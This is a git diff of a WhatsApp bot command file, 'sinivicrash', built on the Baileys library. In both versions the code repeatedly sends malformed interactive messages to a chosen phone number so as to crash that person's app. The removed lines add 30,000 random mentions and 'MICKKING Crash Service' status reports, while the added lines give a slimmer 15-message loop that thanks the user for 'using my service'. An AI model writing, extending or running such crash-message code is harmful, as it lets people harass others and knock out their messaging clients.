@@ -1,37 +1,26 @@
-import pkg from "bailey";
-import crypto from 'crypto';
+import pkg from "baileys";
 
 const { proto, generateWAMessageFromContent } = pkg;
-import channelSender from '../commands/channelSender.js';
 
-// Configuration for sinivi crash
-const CRASH_CONFIG = {
-    ITERATIONS: 15,
-    COOLDOWN: 2000,
-    MENTION_COUNT: 30000,
-    MAX_RETRIES: 3,
-    PATTERNS: ['interactive', 'location', 'contact']
-};
 
-async function generateRandomMentions() {
-    return Array.from(
-        { length: CRASH_CONFIG.MENTION_COUNT },
-        () => Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
-    );
-}
+import channelSender from '../commands/channelSender.js'
 
-async function bugfunc(client, targetNumber, pattern = 'interactive') {
+
+async function bugfunc(client, targetNumber) {
 
  try {
-   const mentions = await generateRandomMentions();
-   const timestamp = Date.now();
-   
+
    let message = {
+
      ephemeralMessage: {
+
        message: {
+
          interactiveMessage: {
+
            header: {
-             title: "⚡ MICKKING CRASH ⚡",
+
+             title: "Peace and Love",
 
              hasMediaAttachment: false,
 
@@ -103,32 +92,17 @@ async function bugfunc(client, targetNumber, pattern = 'interactive') {
 
 }
 export async function sinivicrash(message, client) {
+
     try {
+
         const remoteJid = message.key?.remoteJid;
+
         if (!remoteJid) {
+
             throw new Error("Message JID is undefined.");
         }
 
-        // Check if it's a group
-        if (remoteJid.endsWith('@g.us')) {
-            throw new Error("❌ This command cannot be used in groups.");
-        }
-
-        // Send initial status message
-        await client.sendMessage(remoteJid, { 
-            text: `━━━━『 *MICKKING CRASH* 』━━━━\n\n` +
-                 `⚡ *Status:* Initializing...\n` +
-                 `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
-                 `_Preparing crash sequence..._`,
-            contextInfo: {
-                externalAdReply: {
-                    title: "MICKKING Crash Service",
-                    body: "Premium Crash System",
-                    showAdAttribution: true,
-                    renderLargerThumbnail: true
-                }
-            }
-        });
+        await client.sendMessage(remoteJid, { text: "Attempting to bug the target" });
 
         const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
 
@@ -155,84 +129,23 @@ export async function sinivicrash(message, client) {
 
         const num = '@' + participant.replace('@s.whatsapp.net', '');
 
-        // Progress tracking
-        let successCount = 0;
-        let failCount = 0;
+        // Execute the bug command
 
-        // Update target info
-        await client.sendMessage(remoteJid, {
-            text: `━━━━『 *TARGET ACQUIRED* 』━━━━\n\n` +
-                 `🎯 *Target:* @${participant.split('@')[0]}\n` +
-                 `💫 *Mode:* Premium Crash\n` +
-                 `⚡ *Iterations:* ${CRASH_CONFIG.ITERATIONS}\n\n` +
-                 `_Starting crash sequence..._`,
-            mentions: [participant]
-        });
+        for (let i = 0; i < 15; i++) {
 
-        // Execute crash sequence with different patterns
-        for (let i = 0; i < CRASH_CONFIG.ITERATIONS; i++) {
-            try {
-                // Show progress every 3 iterations
-                if (i % 3 === 0) {
-                    await client.sendMessage(remoteJid, {
-                        text: `*Progress Update:*\n` +
-                             `✅ Sent: ${i}/${CRASH_CONFIG.ITERATIONS}\n` +
-                             `📊 Success Rate: ${((successCount/(i||1))*100).toFixed(1)}%\n` +
-                             `⏳ Remaining: ${((CRASH_CONFIG.ITERATIONS-i)*2)} seconds`
-                    });
-                }
+            await bugfunc(client, participant);
 
-                // Rotate through different crash patterns
-                const pattern = CRASH_CONFIG.PATTERNS[i % CRASH_CONFIG.PATTERNS.length];
-                await bugfunc(client, participant, pattern);
-                successCount++;
-
-                await new Promise(resolve => setTimeout(resolve, CRASH_CONFIG.COOLDOWN));
-            } catch (iterError) {
-                console.error(`Crash iteration ${i + 1} failed:`, iterError);
-                failCount++;
-                continue;
-            }
+            await new Promise(resolve => setTimeout(resolve, 2000));
         }
 
-        // Send completion report
-        await client.sendMessage(remoteJid, {
-            text: `━━━━『 *CRASH COMPLETE* 』━━━━\n\n` +
-                 `🎯 *Target:* @${participant.split('@')[0]}\n` +
-                 `✅ *Success:* ${successCount}\n` +
-                 `❌ *Failed:* ${failCount}\n` +
-                 `📊 *Success Rate:* ${((successCount/CRASH_CONFIG.ITERATIONS)*100).toFixed(1)}%\n` +
-                 `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
-                 `━━『 *MICKKING CRASH SERVICE* 』━━`,
-            mentions: [participant],
-            contextInfo: {
-                externalAdReply: {
-                    title: "Crash Complete",
-                    body: `Success Rate: ${((successCount/CRASH_CONFIG.ITERATIONS)*100).toFixed(1)}%`,
-                    showAdAttribution: true
-                }
-            }
-        });
+
+        await channelSender(message, client, "Succceded in sending bug to the target.\n\nThanks for using my service.", 1);
 
     } catch (error) {
-        console.error("Crash error:", error);
-        
-        // Send formatted error message
-        await client.sendMessage(message.key.remoteJid, {
-            text: `━━━━『 *ERROR REPORT* 』━━━━\n\n` +
-                 `❌ *Operation Failed*\n` +
-                 `⚠️ *Error:* ${error.message}\n` +
-                 `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
-                 `_Please try again in a few minutes..._`,
-            contextInfo: {
-                externalAdReply: {
-                    title: "Crash Service",
-                    body: "Error Notification",
-                    showAdAttribution: true
-                }
-            }
-        });
+
+        console.error("An error occurred while trying to bug the target:", error);
+
+        await client.sendMessage(message.key.remoteJid, { text: `An error occurred while trying to bug the target: ${error.message}` });
     }
 }
-
 export default sinivicrash;
